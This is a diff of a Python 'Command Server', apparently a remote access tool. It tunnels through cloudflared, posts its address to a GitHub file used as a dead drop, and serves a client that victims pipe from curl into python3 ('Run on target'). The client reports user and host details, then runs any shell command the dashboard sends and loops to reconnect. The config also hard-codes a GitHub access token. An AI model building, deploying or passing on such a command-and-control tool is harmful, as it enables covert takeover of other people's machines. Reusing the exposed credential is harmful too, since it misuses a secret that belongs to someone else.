@@ -1,28 +1,13 @@
 #!/usr/bin/env python3
-"""
-Command Server — single-file remote command execution + web dashboard.
-Starts cloudflared automatically. Clients read the URL from GitHub.
-Requires: pip install aiohttp websockets
-Run:      python3 server.py
-"""
-
-import asyncio
-import json
-import secrets
-import os
-import sys
-import subprocess
-import time
-import urllib.request
-import urllib.error
+import asyncio, json, secrets, os, sys, subprocess, time
+import urllib.request, urllib.error
 from pathlib import Path
 
 try:
     from aiohttp import web, WSMsgType
 except ImportError:
-    sys.exit("Missing dependency. Run: pip install aiohttp")
+    sys.exit("Run: pip install aiohttp")
 
-# ─── CONFIG ───────────────────────────────────────────────────────────────────
 HOST = "0.0.0.0"
 PORT = 8443
 BASE = Path(__file__).resolve().parent
@@ -35,9 +20,11 @@ GITHUB_TOKEN = "github_pat_11CT6YLGQ0M3ZbeLJiOf7O_UI3nhpMGSdIcVmbosXh3XvoJd2r8c7
 GITHUB_OWNER = "yvlfiction"
 GITHUB_REPO = "server"
 GITHUB_FILE = "site"
-GITHUB_URL_FILE = f"https://raw.githubusercontent.com/{GITHUB_OWNER}/{GITHUB_REPO}/refs/heads/main/{GITHUB_FILE}"
+GITHUB_URL_FILE = (
+    f"https://raw.githubusercontent.com/"
+    f"{GITHUB_OWNER}/{GITHUB_REPO}/refs/heads/main/{GITHUB_FILE}"
+)
 
-# ─── LOAD / SAVE CONFIG ───────────────────────────────────────────────────────
 def load_config():
     if CONFIG_FILE.exists():
         return json.loads(CONFIG_FILE.read_text())
@@ -48,49 +35,69 @@ def save_config(cfg):
 
 config = load_config()
 
-# ─── GITHUB HELPERS ───────────────────────────────────────────────────────────
-def github_push_url(url):
+def github_diag():
+    print(f"\n  [github] Testing token...")
     try:
         req = urllib.request.Request(
-            f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}",
+            f"https://api.github.com/repos/"
+            f"{GITHUB_OWNER}/{GITHUB_REPO}",
             headers={"Authorization": f"token {GITHUB_TOKEN}"}
         )
         with urllib.request.urlopen(req) as r:
-            sha = json.loads(r.read())["sha"]
+            d = json.loads(r.read())
+            print(f"  [github] OK: {d['full_name']}")
+    except urllib.error.HTTPError as e:
+        print(f"  [github] FAIL {e.code}: {e.read().decode()[:200]}")
+    except Exception as e:
+        print(f"  [github] ERR: {e}")
+
+def github_push_url(url):
+    try:
+        url_api = (
+            f"https://api.github.com/repos/"
+            f"{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}"
+        )
+        hdrs = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Content-Type": "application/json"
+        }
+        try:
+            req = urllib.request.Request(url_api, headers=hdrs)
+            with urllib.request.urlopen(req) as r:
+                sha = json.loads(r.read())["sha"]
+            payload = {
+                "message": f"URL: {url}",
+                "content": url.encode().hex(),
+                "sha": sha
+            }
+        except urllib.error.HTTPError as e:
+            if e.code == 404:
+                payload = {
+                    "message": f"Create: {url}",
+                    "content": url.encode().hex()
+                }
+            else:
+                raise
         req2 = urllib.request.Request(
-            f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}",
-            data=json.dumps({"message": f"URL: {url}", "content": url.encode().hex(), "sha": sha}).encode(),
-            headers={"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"},
-            method="PUT"
+            url_api, data=json.dumps(payload).encode(),
+            headers=hdrs, method="PUT"
         )
         with urllib.request.urlopen(req2) as r:
             pass
-        print(f"  \u2713 URL pushed to GitHub")
-        return True
+        print(f"  [github] Pushed: {url}")
     except urllib.error.HTTPError as e:
-        if e.code == 404:
-            req3 = urllib.request.Request(
-                f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}",
-                data=json.dumps({"message": f"Create: {url}", "content": url.encode().hex()}).encode(),
-                headers={"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"},
-                method="PUT"
-            )
-            with urllib.request.urlopen(req3) as r:
-                pass
-            print(f"  \u2713 URL file created on GitHub")
-            return True
-        body = e.read().decode()[:200]
-        print(f"  \u26a0 GitHub push failed ({e.code}): {body}")
-        return False
+        print(f"  [github] Push FAIL {e.code}: {e.read().decode()[:200]}")
     except Exception as e:
-        print(f"  \u26a0 GitHub push failed: {e}")
-        return False
+        print(f"  [github] Push ERR: {e}")
 
-# ─── CLOUDFLARED ──────────────────────────────────────────────────────────────
 def start_cloudflared():
+    cmd = ["cloudflared", "tunnel", "--url",
+           f"http://localhost:{PORT}"]
     proc = subprocess.Popen(
-        ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True
     )
     url = None
     for _ in range(60):
@@ -104,14 +111,14 @@ def start_cloudflared():
             break
     return proc, url
 
-# ─── CLIENT TEMPLATE ──────────────────────────────────────────────────────────
 CLIENT_TEMPLATE = r'''
-import asyncio, json, os, platform, socket, subprocess, sys, urllib.request, websockets
+import asyncio, json, os, platform, socket
+import subprocess, sys, urllib.request, websockets
 
 SERVER_URL = "__SERVER_URL__"
 CONFIG_URL = "__CONFIG_URL__"
 
-async def get_current_url():
+def get_url():
     try:
         req = urllib.request.Request(CONFIG_URL)
         with urllib.request.urlopen(req, timeout=5) as r:
@@ -122,227 +129,268 @@ async def get_current_url():
 async def main():
     while True:
         try:
-            url = await get_current_url()
-            async with websockets.connect(f"wss://{url}/ws/client") as ws:
-                await ws.send(json.dumps({{"type": "register", "id": "__CLIENT_ID__", "token": "__CLIENT_TOKEN__",
-                    "info": {{"os": platform.system(), "user": os.environ.get("USER", os.environ.get("USERNAME","?")),
-                              "host": socket.gethostname(), "arch": platform.machine()}}}}))
+            url = get_url()
+            async with websockets.connect(
+                f"wss://{url}/ws/client"
+            ) as ws:
+                await ws.send(json.dumps({
+                    "type": "register",
+                    "id": "__CLIENT_ID__",
+                    "token": "__CLIENT_TOKEN__",
+                    "info": {
+                        "os": platform.system(),
+                        "user": os.environ.get(
+                            "USER",
+                            os.environ.get("USERNAME", "?")
+                        ),
+                        "host": socket.gethostname(),
+                        "arch": platform.machine()
+                    }
+                }))
                 async for msg in ws:
                     d = json.loads(msg)
                     if d["type"] == "cmd":
-                        p = await asyncio.get_event_loop().run_in_executor(
-                            None, lambda c=d["cmd"]: subprocess.run(c, shell=True, capture_output=True, text=True, cwd=os.path.expanduser("~")))
-                        await ws.send(json.dumps({{"type": "output", "id": "__CLIENT_ID__", "cmd": d["cmd"],
-                            "stdout": p.stdout, "stderr": p.stderr, "rc": p.returncode}}))
+                        p = subprocess.run(
+                            d["cmd"], shell=True,
+                            capture_output=True, text=True
+                        )
+                        await ws.send(json.dumps({
+                            "type": "output",
+                            "id": "__CLIENT_ID__",
+                            "stdout": p.stdout,
+                            "stderr": p.stderr,
+                            "rc": p.returncode
+                        }))
                     elif d["type"] == "ping":
-                        await ws.send(json.dumps({{"type": "pong", "id": "__CLIENT_ID__"}}))
+                        await ws.send(json.dumps({
+                            "type": "pong",
+                            "id": "__CLIENT_ID__"
+                        }))
         except Exception:
             await asyncio.sleep(5)
 
 asyncio.run(main())
 '''
 
-# ─── DASHBOARD HTML ───────────────────────────────────────────────────────────
 DASHBOARD_HTML = r'''<!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Command Server</title>
+<html><head><meta charset="utf-8">
+<title>Command Server</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-height:100vh}
-.header{padding:20px 30px;border-bottom:1px solid #0f0;display:flex;justify-content:space-between;align-items:center}
-.header h1{color:#0f0;text-shadow:0 0 10px #0f0;font-size:1.4rem}
-.header .status{color:#0f0;font-size:.8rem}
-.container{padding:20px 30px}
-.url-box{margin-bottom:24px;padding:16px 20px;border:1px solid #fff;border-radius:8px;background:#111;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
-.url-box label{color:#fff;font-size:.85rem;white-space:nowrap}
-.url-box input{flex:1;min-width:250px;background:#222;border:1px solid #0f0;color:#0f0;padding:8px 12px;font-family:inherit;font-size:.9rem;border-radius:4px;outline:none}
-.url-box input:focus{box-shadow:0 0 8px rgba(0,255,0,.3)}
-.url-box button{background:#0f0;color:#000;border:none;padding:8px 18px;cursor:pointer;border-radius:4px;font-family:inherit;font-weight:bold;font-size:.85rem}
-.url-box button:hover{box-shadow:0 0 12px #0f0}
-.url-box .saved{color:#0f0;font-size:.75rem;display:none}
-.url-box .github-link{color:#888;font-size:.75rem;margin-top:6px;display:block;width:100%}
-.clients{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
-.card{background:#111;border:1px solid #0f0;border-radius:8px;padding:16px;box-shadow:0 0 8px rgba(0,255,0,.15)}
-.card .name{color:#0f0;font-weight:bold;font-size:1.1rem;text-shadow:0 0 6px #0f0}
-.card .meta{color:#aaa;font-size:.75rem;margin-top:6px;line-height:1.6}
-.card .btn{margin-top:12px;margin-right:6px;padding:6px 14px;background:transparent;border:1px solid #0f0;color:#0f0;cursor:pointer;border-radius:4px;font-family:inherit;font-size:.8rem;transition:all .2s}
-.card .btn:hover{background:#0f0;color:#000;box-shadow:0 0 12px #0f0}
-.card .btn.danger{border-color:#f00;color:#f00}
-.card .btn.danger:hover{background:#f00;color:#fff;box-shadow:0 0 12px #f00}
-.terminal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.95);z-index:100;padding:20px}
-.terminal-overlay.active{display:flex;flex-direction:column}
-.term-header{display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;border-bottom:1px solid #0f0}
-.term-header span{color:#0f0;text-shadow:0 0 8px #0f0}
-.term-close{background:transparent;border:1px solid #f00;color:#f00;padding:4px 12px;cursor:pointer;border-radius:4px;font-family:inherit}
-.term-close:hover{background:#f00;color:#fff}
-.term-body{flex:1;overflow-y:auto;padding:12px;font-size:.85rem;line-height:1.5}
-.term-body .prompt{color:#0f0}
-.term-body .output{color:#fff;white-space:pre-wrap;word-break:break-all}
-.term-body .error{color:#f44}
-.term-input{display:flex;gap:8px;padding-top:10px;border-top:1px solid #333}
-.term-input input{flex:1;background:#111;border:1px solid #0f0;color:#fff;padding:8px 12px;font-family:inherit;font-size:.9rem;border-radius:4px;outline:none}
-.term-input input:focus{box-shadow:0 0 8px rgba(0,255,0,.3)}
-.term-input button{background:#0f0;color:#000;border:none;padding:8px 20px;cursor:pointer;border-radius:4px;font-family:inherit;font-weight:bold}
-.term-input button:hover{box-shadow:0 0 12px #0f0}
-.section-title{color:#fff;font-size:.9rem;margin-bottom:12px;text-transform:uppercase;letter-spacing:2px}
-.empty{color:#555;text-align:center;padding:60px;font-size:1rem}
-.rebuild-box{margin-top:30px;padding:20px;border:1px solid #fff;border-radius:8px;background:#111}
-.rebuild-box h3{color:#fff;margin-bottom:12px}
-.rebuild-box code{background:#222;padding:2px 6px;border-radius:3px;color:#0f0;font-size:.85rem}
-.rebuild-box .hint{color:#aaa;font-size:.8rem;margin-bottom:10px}
-.rebuild-box button{padding:6px 14px;background:transparent;border:1px solid #0f0;color:#0f0;cursor:pointer;border-radius:4px;font-family:inherit;font-size:.8rem}
-.rebuild-box button:hover{background:#0f0;color:#000}
-.rebuild-out{margin-top:10px;color:#0f0;font-size:.75rem;white-space:pre-wrap;display:none;background:#000;padding:10px;border-radius:4px}
+body{background:#0a0a0a;color:#fff;
+font-family:'JetBrains Mono','Courier New',monospace;
+min-height:100vh}
+.header{padding:16px 24px;border-bottom:1px solid #0f0;
+display:flex;justify-content:space-between;align-items:center}
+.header h1{color:#0f0;text-shadow:0 0 12px #0f0;
+font-size:1.3rem}
+.header .st{color:#0f0;font-size:.75rem}
+.urlbar{padding:10px 24px;background:#0d0d0d;
+border-bottom:1px solid #222;display:flex;
+align-items:center;gap:10px;font-size:.75rem}
+.urlbar label{color:#888}
+.urlbar input{background:#111;border:1px solid #333;
+color:#0f0;padding:4px 10px;font-family:inherit;
+font-size:.75rem;border-radius:3px;width:280px;outline:none}
+.urlbar input:focus{border-color:#0f0}
+.urlbar button{background:transparent;border:1px solid #0f0;
+color:#0f0;padding:4px 12px;cursor:pointer;border-radius:3px;
+font-family:inherit;font-size:.7rem}
+.urlbar button:hover{background:#0f0;color:#000}
+.main{display:flex;height:calc(100vh - 100px)}
+.side{width:300px;border-right:1px solid #222;
+overflow-y:auto;padding:14px}
+.side h3{color:#888;font-size:.65rem;
+text-transform:uppercase;letter-spacing:2px;margin-bottom:10px}
+.cc{background:#111;border:1px solid #0f0;border-radius:6px;
+padding:12px;margin-bottom:10px;cursor:pointer;transition:.2s}
+.cc:hover{box-shadow:0 0 12px rgba(0,255,0,.3)}
+.cc.on{background:#0a1a0a;box-shadow:0 0 16px rgba(0,255,0,.4)}
+.cc .nm{color:#0f0;font-weight:700;font-size:.9rem}
+.cc .mt{color:#888;font-size:.68rem;margin-top:4px;
+line-height:1.5}
+.cc .dot{display:inline-block;width:7px;height:7px;
+border-radius:50%;background:#0f0;margin-right:5px;
+box-shadow:0 0 5px #0f0}
+.ta{flex:1;display:flex;flex-direction:column;background:#050505}
+.th{padding:10px 16px;border-bottom:1px solid #222;
+display:flex;justify-content:space-between;align-items:center;
+background:#111}
+.th span{color:#0f0;font-size:.85rem;
+text-shadow:0 0 6px #0f0}
+.th button{background:transparent;border:1px solid #f44;
+color:#f44;padding:3px 10px;cursor:pointer;border-radius:3px;
+font-family:inherit;font-size:.7rem}
+.th button:hover{background:#f44;color:#fff}
+.tb{flex:1;overflow-y:auto;padding:12px 16px;
+font-size:.82rem;line-height:1.6}
+.tb::-webkit-scrollbar{width:6px}
+.tb::-webkit-scrollbar-track{background:#111}
+.tb::-webkit-scrollbar-thumb{background:#0f0;border-radius:3px}
+.tb .ln{white-space:pre-wrap;word-break:break-all}
+.tb .pr{color:#0f0}
+.tb .so{color:#fff}
+.tb .se{color:#f44}
+.tb .sy{color:#888;font-style:italic}
+.tb .ru{color:#555}
+.tib{display:flex;align-items:center;padding:10px 16px;
+border-top:1px solid #222;background:#111;gap:8px}
+.tib .ps{color:#0f0;font-weight:700;font-size:.9rem}
+.tib input{flex:1;background:transparent;border:none;
+color:#fff;font-family:inherit;font-size:.85rem;outline:none}
+.tib input::placeholder{color:#444}
+.tp{flex:1;display:flex;align-items:center;
+justify-content:center;color:#333;font-size:1rem}
 </style></head><body>
 <div class="header">
-  <h1>\u2b21 COMMAND SERVER</h1>
-  <div class="status" id="status">connecting\u2026</div>
+<h1>&#x2B21; COMMAND SERVER</h1>
+<div class="st" id="st">connecting...</div>
 </div>
-<div class="container">
-  <div class="url-box">
-    <label>Server URL:</label>
-    <input id="url-input" placeholder="your-tunnel.trycloudflare.com">
-    <button onclick="saveUrl()">Save to GitHub</button>
-    <span class="saved" id="url-saved">\u2713 saved</span>
-    <span class="github-link">Clients read from: <a href="https://github.com/yvlfiction/server/blob/main/site" target="_blank" style="color:#0f0">github.com/yvlfiction/server/site</a></span>
-  </div>
-  <div class="section-title">Connected Clients</div>
-  <div class="clients" id="clients"><div class="empty">No clients connected</div></div>
-  <div class="rebuild-box">
-    <h3>Generate Client</h3>
-    <p class="hint">Run on target: <code>curl -s https://YOUR_URL/client | python3</code></p>
-    <button onclick="rebuild()">Generate Client Script</button>
-    <pre class="rebuild-out" id="rebuild-out"></pre>
-  </div>
+<div class="urlbar">
+<label>URL:</label>
+<input id="ui" placeholder="tunnel.trycloudflare.com">
+<button onclick="su()">Push to GitHub</button>
 </div>
-<div class="terminal-overlay" id="term-overlay">
-  <div class="term-header">
-    <span id="term-title">Terminal</span>
-    <button class="term-close" onclick="closeTerm()">\u2715 Close</button>
-  </div>
-  <div class="term-body" id="term-body"></div>
-  <div class="term-input">
-    <input id="term-input" placeholder="Enter command\u2026" autocomplete="off">
-    <button onclick="sendCmd()">Run</button>
-  </div>
+<div class="main">
+<div class="side">
+<h3>Clients</h3>
+<div id="cl"><div class="tp" style="padding:40px 0">
+No clients</div></div>
+</div>
+<div class="ta">
+<div class="tp" id="ph">
+Select a client to open terminal</div>
+<div id="tp" style="display:none;flex:1;
+display:flex;flex-direction:column">
+<div class="th">
+<span id="tt">Terminal</span>
+<button onclick="ct()">&#x2715;</button>
+</div>
+<div class="tb" id="tb"></div>
+<div class="tib">
+<span class="ps">$</span>
+<input id="ti" placeholder="type command..."
+autocomplete="off" spellcheck="false">
+</div>
+</div>
+</div>
 </div>
 <script>
-let ws, currentClient = null;
-const clientsEl = document.getElementById('clients');
-const statusEl = document.getElementById('status');
-const termOverlay = document.getElementById('term-overlay');
-const termBody = document.getElementById('term-body');
-const termInput = document.getElementById('term-input');
-const termTitle = document.getElementById('term-title');
-const urlInput = document.getElementById('url-input');
-const urlSaved = document.getElementById('url-saved');
-const rebuildOut = document.getElementById('rebuild-out');
-
-fetch('/api/config').then(r=>r.json()).then(d=>{ urlInput.value = d.server_url || ''; });
-
-function connect() {
-  ws = new WebSocket(`ws://${location.host}/ws/dashboard`);
-  ws.onopen = () => statusEl.textContent = '\u25cf online';
-  ws.onclose = () => { statusEl.textContent = '\u25cf reconnecting\u2026'; setTimeout(connect, 2000); };
-  ws.onmessage = (e) => {
-    const d = JSON.parse(e.data);
-    if (d.type === 'clients') renderClients(d.clients);
-    if (d.type === 'output') appendOutput(d);
-  };
+let ws,ac=null,lc=[];
+const cl=document.getElementById('cl');
+const st=document.getElementById('st');
+const ph=document.getElementById('ph');
+const tp=document.getElementById('tp');
+const tb=document.getElementById('tb');
+const ti=document.getElementById('ti');
+const tt=document.getElementById('tt');
+const ui=document.getElementById('ui');
+fetch('/api/config').then(r=>r.json()).then(
+d=>{ui.value=d.server_url||''});
+function cn(){
+ws=new WebSocket(
+`ws://${location.host}/ws/dashboard`);
+ws.onopen=()=>{st.textContent='\u25cf online'};
+ws.onclose=()=>{st.textContent='\u25cf reconnecting...';
+setTimeout(cn,2000)};
+ws.onmessage=e=>{
+const d=JSON.parse(e.data);
+if(d.type==='clients')rc(d.clients);
+if(d.type==='output')ho(d);
+};
 }
-
-function renderClients(clients) {
-  if (!clients.length) { clientsEl.innerHTML = '<div class="empty">No clients connected</div>'; return; }
-  clientsEl.innerHTML = clients.map(c => `
-    <div class="card">
-      <div class="name">${c.id}</div>
-      <div class="meta">OS: ${c.info.os} ${c.info.arch}<br>User: ${c.info.user}<br>Host: ${c.info.host}<br>Since: ${new Date(c.since*1000).toLocaleTimeString()}</div>
-      <button class="btn" onclick="openTerm('${c.id}')">\u2328 Terminal</button>
-      <button class="btn danger" onclick="killClient('${c.id}')">\u2715 Kill</button>
-    </div>`).join('');
+function rc(c){
+lc=c;
+if(!c.length){cl.innerHTML='<div class="tp" style="padding:40px 0">No clients</div>';return}
+cl.innerHTML=c.map(x=>
+`<div class="cc ${x.id===ac?'on':''}" onclick="ot('${x.id}')">
+<div class="nm"><span class="dot"></span>${x.id}</div>
+<div class="mt">${x.info.os} ${x.info.arch}
+&middot; ${x.info.user}@${x.info.host}</div>
+</div>`).join('');
 }
-
-function openTerm(id) {
-  currentClient = id;
-  termTitle.textContent = `\u2328 ${id}`;
-  termBody.innerHTML = '<div class="output">Connected to ' + id + '. Enter a command below.</div>';
-  termOverlay.classList.add('active');
-  termInput.focus();
+function ot(id){
+ac=id;ph.style.display='none';tp.style.display='flex';
+tt.textContent='\u2B21 '+id;
+tb.innerHTML='<div class="ln sy">Connected to '+id+'</div>';
+ti.focus();rc(lc);
 }
-
-function closeTerm() { termOverlay.classList.remove('active'); currentClient = null; }
-
-function sendCmd() {
-  const cmd = termInput.value.trim();
-  if (!cmd || !currentClient) return;
-  termBody.innerHTML += `<div class="prompt">$ ${cmd}</div><div class="output">\u23f3 running\u2026</div>`;
-  termBody.scrollTop = termBody.scrollHeight;
-  ws.send(JSON.stringify({type:'cmd', id: currentClient, cmd}));
-  termInput.value = '';
+function ct(){
+ac=null;tp.style.display='none';ph.style.display='flex';
+rc(lc);
 }
-
-function appendOutput(d) {
-  if (d.id !== currentClient) return;
-  const blocks = termBody.querySelectorAll('.output');
-  const last = blocks[blocks.length - 1];
-  let text = '';
-  if (d.stdout) text += d.stdout;
-  if (d.stderr) text += '\n' + d.stderr;
-  if (!text) text = '(no output, exit ' + d.rc + ')';
-  if (d.rc !== 0) last.className = 'error';
-  last.textContent = text;
-  termBody.scrollTop = termBody.scrollHeight;
+function sc(){
+const c=ti.value.trim();
+if(!c||!ac)return;
+al('pr','$ '+c);al('ru','...');
+tb.scrollTop=tb.scrollHeight;
+ws.send(JSON.stringify({type:'cmd',id:ac,cmd:c}));
+ti.value='';
 }
-
-function killClient(id) {
-  if (confirm('Kill client ' + id + '?')) ws.send(JSON.stringify({type:'kill', id}));
+function ho(d){
+if(d.id!==ac)return;
+const r=tb.querySelector('.ru');
+if(r)r.remove();
+if(d.stdout)al('so',d.stdout);
+if(d.stderr)al('se',d.stderr);
+if(!d.stdout&&!d.stderr)al('sy','(exit '+d.rc+')');
+else if(d.rc!==0)al('sy','exit '+d.rc);
+tb.scrollTop=tb.scrollHeight;
 }
-
-function saveUrl() {
-  const url = urlInput.value.trim().replace(/^https?:\/\//, '');
-  fetch('/api/config', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({server_url: url})})
-    .then(r=>r.json()).then(d=>{
-      urlSaved.style.display = 'inline';
-      setTimeout(()=>urlSaved.style.display='none', 2000);
-    });
+function al(c,t){
+const d=document.createElement('div');
+d.className='ln '+c;d.textContent=t;
+tb.appendChild(d);
 }
-
-function rebuild() {
-  fetch('/api/rebuild').then(r=>r.text()).then(t => {
-    rebuildOut.textContent = t;
-    rebuildOut.style.display = 'block';
-  });
+function su(){
+const u=ui.value.trim().replace(/^https?:\/\//,'');
+fetch('/api/config',{method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({server_url:u})}).then(r=>r.json());
 }
-
-urlInput.addEventListener('keydown', e => { if (e.key === 'Enter') saveUrl(); });
-termInput.addEventListener('keydown', e => { if (e.key === 'Enter') sendCmd(); });
-connect();
+ti.addEventListener('keydown',e=>{
+if(e.key==='Enter')sc()});
+ui.addEventListener('keydown',e=>{
+if(e.key==='Enter')su()});
+cn();
 </script></body></html>'''
 
-# ─── STATE ────────────────────────────────────────────────────────────────────
 clients = {}
 dashboard_ws = set()
 
 def save_clients():
-    data = {cid: {"token": c["token"], "info": c["info"]} for cid, c in clients.items()}
+    data = {
+        cid: {"token": c["token"], "info": c["info"]}
+        for cid, c in clients.items()
+    }
     CLIENTS_FILE.write_text(json.dumps(data, indent=2))
 
 def load_clients():
     if CLIENTS_FILE.exists():
         data = json.loads(CLIENTS_FILE.read_text())
         for cid, info in data.items():
-            clients[cid] = {"token": info["token"], "info": info["info"], "ws": None, "since": 0}
+            clients[cid] = {
+                "token": info["token"],
+                "info": info["info"],
+                "ws": None,
+                "since": 0
+            }
 
 def broadcast():
-    payload = json.dumps({"type": "clients", "clients": [
-        {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
-    ]})
+    payload = json.dumps({
+        "type": "clients",
+        "clients": [
+            {"id": cid, "info": c["info"], "since": c["since"]}
+            for cid, c in clients.items() if c["ws"]
+        ]
+    })
     for ws in list(dashboard_ws):
         asyncio.ensure_future(ws.send_str(payload))
 
-# ─── HANDLERS ─────────────────────────────────────────────────────────────────
-
 async def index(request):
-    return web.Response(text=DASHBOARD_HTML, content_type="text/html")
+    return web.Response(
+        text=DASHBOARD_HTML, content_type="text/html"
+    )
 
 async def api_config_get(request):
     return web.json_response(config)
@@ -350,19 +398,26 @@ async def api_config_get(request):
 async def api_config_post(request):
     data = await request.json()
     if "server_url" in data:
-        url = data["server_url"].strip().replace("https://", "").replace("http://", "")
+        url = data["server_url"].strip()
+        url = url.replace("https://", "").replace("http://", "")
         config["server_url"] = url
         save_config(config)
         github_push_url(url)
-    return web.json_response({"ok": True, "server_url": config["server_url"]})
+    return web.json_response(
+        {"ok": True, "server_url": config["server_url"]}
+    )
 
 async def dashboard_ws_handler(request):
     ws = web.WebSocketResponse()
     await ws.prepare(request)
     dashboard_ws.add(ws)
-    await ws.send_json({"type": "clients", "clients": [
-        {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
-    ]})
+    await ws.send_json({
+        "type": "clients",
+        "clients": [
+            {"id": cid, "info": c["info"], "since": c["since"]}
+            for cid, c in clients.items() if c["ws"]
+        ]
+    })
     try:
         async for msg in ws:
             if msg.type == WSMsgType.TEXT:
@@ -370,7 +425,9 @@ async def dashboard_ws_handler(request):
                 if d["type"] == "cmd":
                     cid, cmd = d["id"], d["cmd"]
                     if cid in clients and clients[cid]["ws"]:
-                        await clients[cid]["ws"].send_json({"type": "cmd", "cmd": cmd})
+                        await clients[cid]["ws"].send_json(
+                            {"type": "cmd", "cmd": cmd}
+                        )
                 elif d["type"] == "kill":
                     cid = d["id"]
                     if cid in clients and clients[cid]["ws"]:
@@ -394,14 +451,15 @@ async def client_ws_handler(request):
                 d = json.loads(msg.data)
                 if d["type"] == "register":
                     cid = d["id"]
-                    if cid in clients and clients[cid]["token"] == d["token"]:
+                    if cid in clients and \
+                       clients[cid]["token"] == d["token"]:
                         clients[cid]["ws"] = ws
                         clients[cid]["since"] = time.time()
                         clients[cid]["info"] = d["info"]
                         broadcast()
                         save_clients()
                     else:
-                        await ws.close(code=4001, message=b"bad auth")
+                        await ws.close(code=4001)
                         return ws
                 elif d["type"] == "output":
                     for dw in list(dashboard_ws):
@@ -420,42 +478,61 @@ async def client_ws_handler(request):
 async def client_download(request):
     cid = secrets.token_hex(6)
     token = secrets.token_hex(16)
-    clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
+    clients[cid] = {
+        "token": token, "info": {}, "ws": None, "since": 0
+    }
     save_clients()
     server_url = config["server_url"] or request.host
-    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url).replace("__CONFIG_URL__", GITHUB_URL_FILE)
-    return web.Response(text=code, content_type="text/x-python")
+    code = CLIENT_TEMPLATE.replace(
+        "__CLIENT_ID__", cid
+    ).replace(
+        "__CLIENT_TOKEN__", token
+    ).replace(
+        "__SERVER_URL__", server_url
+    ).replace(
+        "__CONFIG_URL__", GITHUB_URL_FILE
+    )
+    return web.Response(
+        text=code, content_type="text/x-python"
+    )
 
 async def api_rebuild(request):
     cid = secrets.token_hex(6)
     token = secrets.token_hex(16)
-    clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
+    clients[cid] = {
+        "token": token, "info": {}, "ws": None, "since": 0
+    }
     save_clients()
     server_url = config["server_url"] or f"localhost:{PORT}"
-    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url).replace("__CONFIG_URL__", GITHUB_URL_FILE)
-    return web.Response(text=f"# Client ID: {cid}\n# Save as client.py and run: python3 client.py\n\n{code}", content_type="text/plain")
-
-async def api_clients(request):
-    return web.json_response([
-        {"id": cid, "info": c["info"], "online": bool(c["ws"]), "since": c["since"]}
-        for cid, c in clients.items()
-    ])
-
-# ─── MAIN ─────────────────────────────────────────────────────────────────────
+    code = CLIENT_TEMPLATE.replace(
+        "__CLIENT_ID__", cid
+    ).replace(
+        "__CLIENT_TOKEN__", token
+    ).replace(
+        "__SERVER_URL__", server_url
+    ).replace(
+        "__CONFIG_URL__", GITHUB_URL_FILE
+    )
+    return web.Response(
+        text=f"# Client ID: {cid}\n"
+             f"# Run: python3 client.py\n\n{code}",
+        content_type="text/plain"
+    )
 
 async def on_startup(app):
     load_clients()
-    print(f"\n  \u2b21 Starting cloudflared tunnel\u2026")
+    github_diag()
+    print(f"\n  Starting cloudflared...")
     cf_proc, url = start_cloudflared()
     if url:
         config["server_url"] = url
         save_config(config)
         github_push_url(url)
-        print(f"  \u2713 Public URL: https://{url}")
+        print(f"  Public URL: https://{url}")
     else:
-        print(f"  \u26a0 Could not detect tunnel URL. Set it manually in dashboard.")
+        print(f"  Could not detect tunnel URL.")
     print(f"\n  Dashboard: http://localhost:{PORT}")
-    print(f"  Client:    curl -s https://{url or '<your-url>'}/client | python3\n")
+    print(f"  Client: curl -s https://{url or '<url>'}/client | python3\n")
     app["cf_proc"] = cf_proc
 
 async def on_shutdown(app):
@@ -477,7 +554,6 @@ def main():
     app.router.add_get("/ws/client", client_ws_handler)
     app.router.add_get("/client", client_download)
     app.router.add_get("/api/rebuild", api_rebuild)
-    app.router.add_get("/api/clients", api_clients)
     app.router.add_get("/api/config", api_config_get)
     app.router.add_post("/api/config", api_config_post)
     web.run_app(app, host=HOST, port=PORT)
